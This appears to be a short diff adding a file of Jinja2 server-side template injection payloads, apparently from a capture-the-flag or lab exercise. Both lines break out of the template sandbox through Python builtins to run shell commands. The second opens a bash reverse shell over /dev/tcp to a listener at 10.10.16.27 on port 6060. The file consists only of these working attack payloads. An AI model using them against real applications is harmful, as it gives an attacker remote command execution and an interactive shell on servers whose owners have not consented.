@@ -1,0 +1,4 @@
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('revshel').read() }}
+
+
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.16.27/6060 0>&1"').read() }}
